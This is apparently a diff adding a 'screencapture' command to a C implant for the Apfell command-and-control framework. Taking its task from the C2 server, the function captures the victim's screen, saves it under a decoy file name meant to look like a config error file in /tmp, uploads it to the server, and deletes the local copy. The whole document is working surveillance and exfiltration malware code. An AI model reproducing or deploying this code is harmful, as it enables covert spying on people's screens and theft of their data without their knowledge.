@@ -1,0 +1,34 @@
+/* takes in the parameter: {"command":"screencapture",
+                            "params":"",
+                            "id":"task number"}
+* reads the file and sends it out to the Apfell server */
+int screencapture(cJSON* json){
+    unsigned int task_id = cJSON_GetObjectItem(json, "id")->valueint;
+    //take a screenshot and save it to disk
+    system("gnome-screenshot -f /tmp/config-err-IfgXld");
+    //printf("took screenshot\n");
+    FILE* fptr = fopen("/tmp/config-err-IfgXld","rb");
+    if(fptr == NULL){
+        printf("Failed to open file\n");
+        return -1;
+    }
+    fseek(fptr, 0L, SEEK_END);
+    unsigned int size = ftell(fptr);
+    rewind(fptr);
+    //actually download the file to the Apfell server
+    //printf("downloading... %d\n", size);
+    if(global_info->C2.download(fptr, size, task_id) != 0){
+        send_basic_response("Screencapture Failed", cJSON_GetObjectItem(json, "id")->valueint);
+    }else{
+        send_basic_response("Screencapture Finished!", cJSON_GetObjectItem(json, "id")->valueint);
+    }
+    //then remove the file
+    system("rm /tmp/config-err-IfgXld");
+    remove_thread_from_global_info(cJSON_GetObjectItem(json, "id")->valueint);
+    fclose(fptr);
+    cJSON_Delete(json);
+    return SUCCESS;
+}
+
+COMMAND_ENDS_HERE
+int screencapture(cJSON *);
